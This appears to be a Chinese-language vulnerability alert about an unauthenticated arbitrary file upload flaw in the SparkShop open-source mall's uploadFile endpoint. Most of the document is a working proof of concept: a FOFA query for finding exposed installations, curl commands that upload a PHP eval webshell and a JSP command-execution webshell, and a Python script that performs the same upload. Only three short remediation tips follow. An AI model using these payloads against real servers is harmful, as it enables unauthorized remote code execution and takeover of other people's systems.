---
title: 【漏洞预警】SparkShop 开源商城 uploadFile 任意文件上传漏洞
---

## 漏洞概述
SparkShop开源商城 uploadFile 接口存在任意文件上传漏洞，未经身份验证的攻击者可上传恶意文件，获取服务器权限。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | SparkShop开源商城 uploadFile 任意文件上传漏洞 |
| 漏洞类型 | 任意文件上传 |
| 影响组件 | SparkShop开源商城 |
| 严重程度 | 高危 |

## FOFA查询
```
"SparkShop"
```

## POC
```bash
# 上传PHP webshell
curl -X POST "http://target/api/Common/uploadFile" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7Ol0PiiukkdktZR" \
  --data-binary $'------WebKitFormBoundaryj7Ol0PiiukkdktZR\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: text/plain\r\n\r\n<?php eval($_POST[1]);?>\r\n------WebKitFormBoundaryj7Ol0PiiukkdktZR--'

# 上传JSP webshell
curl -X POST "http://target/api/Common/uploadFile" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7Ol0PiiukkdktZR" \
  --data-binary $'------WebKitFormBoundaryj7Ol0PiiukkdktZR\r\nContent-Disposition: form-data; name="file"; filename="shell.jsp"\r\nContent-Type: text/plain\r\n\r\n<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>\r\n------WebKitFormBoundaryj7Ol0PiiukkdktZR--'
```

Python脚本:
```python
import requests

url = "http://target/api/Common/uploadFile"
files = {"file": ("shell.php", "<?php eval($_POST[1]);?>", "text/plain")}
r = requests.post(url, files=files)
print(r.text)
# 返回的路径通常包含 uploads/ 目录
```

## 修复建议
1. 升级到最新版本
2. 限制上传文件类型
3. 部署Web应用防火墙